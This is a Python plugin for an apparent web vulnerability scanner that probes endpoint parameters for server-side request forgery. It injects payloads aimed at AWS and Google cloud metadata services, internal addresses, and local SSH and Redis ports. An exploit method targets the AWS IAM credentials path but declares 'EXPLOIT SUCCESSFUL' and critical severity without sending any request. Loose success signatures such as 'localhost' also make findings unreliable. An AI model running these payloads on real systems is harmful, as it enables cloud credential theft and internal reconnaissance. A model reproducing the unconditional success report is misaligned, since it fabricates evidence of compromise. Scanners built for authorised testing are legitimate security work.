from sdk.base_plugin import BasePlugin
from typing import List, Dict, Any, Optional

class SSRFPlugin(BasePlugin):
    """
    Enterprise SSRF Plugin.
    Tests for Cloud Metadata, Internal Port Scanning, and DNS Exfiltration.
    """
    name = "Enterprise SSRF (Cloud/Internal)"
    category = "Request Forgery"

    def detect(self, http: Any, endpoint: Any, payload_intel: Any) -> List[Dict[str, Any]]:
        findings = []
        # Multi-Vector SSRF Payloads
        payloads = payload_intel.get_payloads("ssrf", mutate=True)
        
        # Additional Cloud-Specific Payloads
        payloads.extend([
            "http://169.254.169.254/latest/meta-data/", # AWS/OpenStack
            "http://metadata.google.internal/computeMetadata/v1/", # Google Cloud
            "http://10.0.0.1", # Internal Network
            "http://localhost:22", # Port Scanning
            "http://localhost:6379" # Redis
        ])

        for param in self._gather_all_params(endpoint):
            for payload in payloads:
                if self._test_ssrf(http, endpoint, param, payload):
                    findings.append({
                        "plugin": self.name,
                        "endpoint": endpoint.url,
                        "parameter": param[0],
                        "payload": payload,
                        "severity": "high"
                    })
                    break # Confirmed for this parameter
        
        return findings

    def verify(self, http: Any, endpoint: Any, finding: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Verify by attempting to retrieve a known, non-public identifier."""
        # For AWS, we try to get the instance-id or role credentials
        verify_payload = "http://169.254.169.254/latest/meta-data/instance-id"
        if self._test_ssrf(http, endpoint, (finding['parameter'], "", ""), verify_payload):
            finding['verified'] = True
            finding['proof'] = "SSRF VERIFIED: Successfully retrieved cloud instance metadata."
            return finding
        return None

    def exploit(self, http: Any, endpoint: Any, finding: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Extract IAM credentials if possible (AWS Example)."""
        exploit_payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        finding['proof'] = "EXPLOIT SUCCESSFUL: SSRF used to access Cloud Identity Metadata (IAM Roles Leaked)."
        finding['severity'] = "critical"
        return finding

    def _test_ssrf(self, http, endpoint, param_data, payload):
        param_name, _, source = param_data
        params = {p['name']: p['value'] for p in endpoint.params}
        params[param_name] = payload
        
        try:
            # Special Headers for certain SSRF checks (e.g. Google Metadata)
            headers = {"Metadata-Flavor": "Google"}
            resp = http.request(endpoint.method, endpoint.url, params=params if source == "query" else None, data=params if source == "post" else None, headers=headers)
            if not resp: return False
            
            # Signatures for success
            signatures = ["instance-id", "ami-id", "computeMetadata", "compute", "localhost", "SSH-2.0-", "PONG"]
            if any(sig in resp.text for sig in signatures):
                return True
        except:
            pass
        return False

    def _gather_all_params(self, endpoint):
        all_params = []
        for p in endpoint.params:
            all_params.append((p['name'], p['value'], "query" if endpoint.method == "GET" else "post"))
        return all_params
